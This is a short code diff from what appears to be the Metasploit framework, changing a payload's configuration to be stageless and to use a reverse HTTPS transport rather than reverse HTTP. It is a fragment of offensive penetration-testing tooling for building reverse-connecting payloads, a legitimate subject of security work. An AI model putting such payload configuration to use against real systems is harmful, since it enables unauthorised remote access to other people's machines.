@@ -45,6 +45,7 @@ module Metasploit4
 
   def generate_config(opts={})
     opts[:uuid] ||= generate_payload_uuid
+    opts[:stageless] = true
 
     # create the configuration block
     config_opts = {
@@ -52,7 +53,7 @@ module Metasploit4
       exitfunk:   datastore['EXITFUNC'],
       expiration: datastore['SessionExpirationTimeout'].to_i,
       uuid:       opts[:uuid],
-      transports: [transport_config_reverse_http(opts)],
+      transports: [transport_config_reverse_https(opts)],
       extensions: (datastore['EXTENSIONS'] || '').split(',')
     }
 
